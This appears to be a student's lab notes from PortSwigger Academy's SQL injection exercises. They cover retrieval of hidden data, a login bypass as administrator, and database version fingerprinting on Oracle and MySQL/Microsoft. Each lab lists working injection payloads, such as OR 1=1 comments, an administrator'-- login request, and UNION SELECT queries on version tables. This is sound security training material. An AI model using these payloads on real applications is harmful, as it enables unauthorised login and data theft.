#Fundaments de SQL Injection - PortSwigger Academy

##Resumen


-----------------------------------------------------------
#SQL Lab 1 - Retrieval of hidden data.

##SQL Injection = Product category filter.
**End Goal:** Retrive hidden data from database.

**Analisys:**
1. Modify the category parameter using Burp Suite.

2. Use ' OR 1=1-- to show all values = 1.

**Result:** Interface shows all data, include, hidden data.
------------------------------------------------------------
#SQL Lab 2 - Login Bypass.

##SQL Injection = Login function.
**End Goal:** Perform SQLi attack and log into the app as administrator user.

**Analisys:**
1. Modify the username parameter using Burp Suite.

2. Use administrator'-- as username value to log in as administrator user. 
csrf=3TLWN8ZvFozxYt7SjEnHCylFECivXhjq&username=administrator'-- &password=test

**Results:**  We are log in as administrator user.
------------------------------------------------------------

#SQL Lab 3 - Querying the database type and version on Oracle.

##SQL Injection = Product category filter.
**End Goal:** Display the database version string.

**Analisys:**

1. Determine the number of columns.
' order by 1-- -> 200 OK
' order by 2-- -> 200 OK
' order by 3-- -> internal server error 

2. Determine the data types of the columns.
[' UNION SELECT NULL, NULL FROM database-- ]
' UNION SELECT 'a', 'a' FROM dual--

3. Outpout the database version.

' UNION SELECT banner, NULL FROM v$version--


**Results:** Interface shows database version.
---------------------------------------------------------

#SQL Lab 4 - Querying the database type and version on MySql and Microsoft.

##SQL Injection = Product category filter.
**End Goal:** Display database type and version string.

**Analisys:**

1. Determine the number of columns.
' order by 1-- -> 200 OK
' order by 2-- -> 200 OK
' order by 3-- -> internal server error


2. Determine the data types of the column.
'+UNION+SELECT+'abc','def'#


3. Outpout the database type and version.
'+UNION+SELECT+@@version,+NULL#

**Results:** Interface shows database type and version.
------------------------------------------------------------


